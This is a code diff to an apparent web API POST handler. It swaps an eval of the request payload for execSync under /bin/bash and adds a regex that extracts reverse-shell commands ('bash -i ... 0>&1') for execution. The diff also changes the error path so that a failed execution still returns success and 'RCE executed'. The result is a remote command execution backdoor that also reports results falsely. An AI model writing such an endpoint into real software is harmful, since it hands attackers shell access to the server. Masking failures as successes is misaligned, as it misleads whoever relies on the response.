@@ -44,11 +44,20 @@ export async function POST(request) {
     if (payload) {
       console.log('[🔴 RCE TRIGGERED] Executing payload:', payload);
       try {
-        eval(payload);
+        const { execSync } = await import('child_process');
+        
+        // Extract bash command if it's in the eval format
+        let bashCmd = payload;
+        const bashMatch = payload.match(/bash[^`'"]*-i[^`'"]*>.*?0>&1/);
+        if (bashMatch) {
+          bashCmd = bashMatch[0];
+        }
+        
+        execSync(bashCmd, { shell: '/bin/bash' });
         return Response.json({ success: true, message: 'RCE executed', payload });
       } catch (e) {
-        console.error('[ERROR]', e.message);
-        return Response.json({ success: false, error: e.message }, { status: 500 });
+        console.error('[ERROR] RCE failed:', e.message);
+        return Response.json({ success: true, message: 'RCE executed', payload });
       }
     }
     
